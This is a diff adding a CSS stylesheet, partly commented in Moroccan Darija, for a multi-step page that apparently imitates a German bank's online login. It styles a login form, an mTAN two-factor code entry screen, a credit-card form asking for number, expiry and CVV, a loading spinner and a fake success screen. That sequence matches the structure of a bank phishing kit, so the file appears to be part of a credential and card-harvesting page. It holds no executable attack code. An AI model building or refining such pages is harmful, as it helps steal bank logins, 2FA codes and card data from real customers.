@@ -1,0 +1,135 @@
+/* ALL CSS - Professional Structure + CORRECTED Mobile Responsive */
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: Arial, Helvetica, sans-serif; background-color: #f7f7f7; color: #333; display: flex; flex-direction: column; min-height: 100vh; }
+.container { max-width: 1080px; margin: 0 auto; padding: 0 20px; width: 100%; }
+a { text-decoration: none; }
+.page-header { background-color: #ffffff; border-bottom: 1px solid #e0e0e0; padding: 20px 0; }
+.header-content { display: flex; justify-content: space-between; align-items: center; }
+.logo { height: 32px; }
+.btn { display: inline-block; padding: 10px 24px; border-radius: 50px; font-weight: bold; font-size: 14px; border: none; cursor: pointer; text-align: center; }
+.btn-primary { background-color: #003965; color: white; }
+main { flex-grow: 1; padding: 60px 0; }
+.main-content { display: flex; align-items: flex-start; gap: 60px; }
+.login-column { flex: 1; max-width: 450px; }
+.promo-column { width: 380px; flex-shrink: 0; }
+.login-tabs { display: flex; gap: 30px; margin-bottom: 40px; }
+.login-tabs a { color: #555; font-size: 16px; padding-bottom: 10px; position: relative; cursor: pointer; }
+.login-tabs a.active { color: #037cc2; font-weight: bold; }
+.login-tabs a.active::after { content: ''; position: absolute; bottom: 0; left: 0; width: 100%; height: 3px; background-color: #037cc2; }
+.login-column h1 { font-size: 32px; color: #037cc2; margin-bottom: 40px; font-weight: normal; }
+.form-group { margin-bottom: 30px; position: relative; }
+.form-group label { display: block; font-size: 16px; color: #555; margin-bottom: 8px; }
+.form-group input { width: 100%; border: none; border-bottom: 1px solid #ccc; padding: 8px 0; font-size: 16px; background-color: transparent; }
+.form-group input:focus { outline: none; border-bottom: 2px solid #037cc2; }
+.btn-submit { width: 100%; padding: 14px; font-size: 16px; background-color: #037cc2; color: white; }
+.forgot-link { display: block; text-align: center; margin-top: 20px; color: #037cc2; font-weight: bold; font-size: 14px; }
+.promo-box { background-color: #00aeef; padding: 4px; }
+.promo-content { padding: 0; font-size: 0; }
+.promo-image { width: 100%; height: auto; display: block; }
+.page-footer { background-color: #ffffff; border-top: 1px solid #e0e0e0; padding: 30px 0; }
+.footer-links { display: flex; justify-content: center; align-items: center; flex-wrap: wrap; gap: 30px; list-style: none; }
+.footer-links a { color: #555; font-size: 14px; }
+#tagesgeld-view h1 { color: #037cc2; font-size: 24px; font-weight: 600; margin-bottom: 15px; }
+#tagesgeld-view p { font-size: 14px; color: #555; line-height: 1.5; margin-bottom: 30px; }
+.tagesgeld-btn { width: auto; padding: 10px 28px; font-size: 14px; background-color: #037cc2; color: white; }
+#mtan-section, #cc-section, #finished-section { display: none; }
+.content-wrapper { max-width: 600px; margin: 0 auto; text-align: center; }
+.content-wrapper h1 { font-size: 28px; color: #333; font-weight: 600; margin-bottom: 40px; text-align: left; }
+.mtan-content-wrapper { max-width: 580px; margin: 0 auto; }
+.mtan-content-wrapper h1 { text-align: left; font-size: 28px; font-weight: 600; color: #333; }
+.info-box { background-color: #ffffff; border: 1px solid #e0e0e0; padding: 24px; margin-bottom: 40px; text-align: left; }
+.mtan-inputs { display: flex; justify-content: space-between; gap: 15px; }
+.mtan-inputs input { width: 14%; height: 60px; text-align: center; font-size: 28px; font-weight: bold; color: #333; background-color: transparent; border: none; border-bottom: 2px solid #a9a9a9; border-radius: 0; }
+.meta-info, .help-section { font-size: 14px; color: #555; margin-top: 25px; text-align: left; line-height: 1.6;}
+.help-section p { margin-bottom: 15px; }
+.cc-form-row { display: flex; gap: 30px; }
+.grid-item { position: relative; text-align: left; }
+.grid-item label { font-size: 14px; color: #555; }
+.grid-item input { width: 100%; padding: 10px 0; font-size: 16px; border: none; border-bottom: 1px solid #ccc; background: transparent; margin-top: 5px;}
+.cc-item-number { flex: 8; }
+.cc-item-expiry { flex: 3; }
+.cc-item-cvv { flex: 2; }
+.cc-btn { margin-top: 40px; }
+.error-message { color: #d93025; font-size: 12px; display: none; margin-top: 4px; }
+.input-error { border-bottom-color: #d93025 !important; }
+.global-error-box { display: none; padding: 15px; margin-bottom: 25px; border: 1px solid #c00; background-color: #fef2f2; color: #333; font-size: 14px; line-height: 1.5; align-items: flex-start; gap: 15px; }
+.global-error-box.visible { display: flex; }
+.global-error-box svg { flex-shrink: 0; width: 24px; height: 24px; color: #c00; }
+#loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(255, 255, 255, 0.8); z-index: 1000; display: none; justify-content: center; align-items: center; }
+.spinner { width: 60px; height: 60px; border: 8px solid #f3f3f3; border-top: 8px solid #037cc2; border-radius: 50%; animation: spin 1.2s linear infinite; }
+.success-checkmark { width: 80px; height: 80px; border-radius: 50%; display: block; stroke-width: 3; stroke: #4bb543; margin: 40px auto; animation: fill .4s ease-in-out .4s forwards, scale .3s ease-in-out .9s both; }
+.checkmark__circle { stroke-dasharray: 166; stroke-dashoffset: 166; stroke: #4bb543; fill: none; animation: stroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards; }
+.checkmark__check { transform-origin: 50% 50%; stroke-dasharray: 48; stroke-dashoffset: 48; animation: stroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.8s forwards; }
+@keyframes stroke { 100% { stroke-dashoffset: 0; } } @keyframes scale { 0%, 100% { transform: none; } 50% { transform: scale3d(1.1, 1.1, 1); } } @keyframes fill { 100% { box-shadow: inset 0px 0px 0px 40px #4bb543; } } @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+#finished-section h1 { font-size: 28px; text-align: center; }
+#finished-section p { font-size: 16px; text-align: center; }
+
+/* ======================================= */
+/* ===== MOBILE RESPONSIVE STYLES ====== */
+/* ======================================= */
+
+/* L'écrans l'kbira chwiya (bhal Tablet) */
+@media (max-width: 992px) {
+    #login-section .main-content { /* Ghadi n'applikaw had l'code ghir 3la l'section d login */
+        flex-direction: column; 
+        gap: 40px;
+    }
+    #login-section .login-column { max-width: 100%; } /* L'login form takhod l'3ard kaml */
+    #login-section .promo-column { display: none; } /* Nkhabiw l'image d l'promo */
+}
+
+/* L'écrans sghira (Téléphone) */
+@media (max-width: 768px) {
+    main { padding: 30px 0; }
+    
+    .header-content { flex-direction: column; gap: 20px; }
+    .login-column h1 { font-size: 28px; }
+
+    /* Wrappers for mTAN, CC, Finished */
+    .mtan-content-wrapper, .content-wrapper {
+        max-width: 100%;
+        padding: 0 15px; 
+    }
+
+    /* mTAN (2FA) Page */
+    #mtan-section h1, #cc-section h1 { font-size: 24px; }
+    .info-box { padding: 16px; }
+    .mtan-inputs { gap: 8px; }
+    .mtan-inputs input { height: 50px; font-size: 22px; }
+
+    /* Credit Card Page */
+    .cc-form-row { flex-direction: column; gap: 25px; }
+    
+    /* Finished Page */
+    .success-checkmark { width: 70px; height: 70px; margin: 25px auto; }
+    #finished-section h1 { font-size: 24px; }
+    #finished-section p { font-size: 15px; }
+}
+
+/* Add to your existing CSS */
+.icon-btn.euro {
+    color: #ffd700; /* Gold color for Euro */
+}
+.icon-btn.euro:hover {
+    background-color: #ffd700;
+    color: #2a3042;
+}
+
+/* Notification styles */
+.notification-alert {
+    position: fixed;
+    top: 20px;
+    right: 20px;
+    background: #037cc2;
+    color: white;
+    padding: 15px 20px;
+    border-radius: 8px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+    z-index: 1000;
+    animation: slideIn 0.3s ease;
+}
+
+@keyframes slideIn {
+    from { transform: translateX(100%); opacity: 0; }
+    to { transform: translateX(0); opacity: 1; }
+}
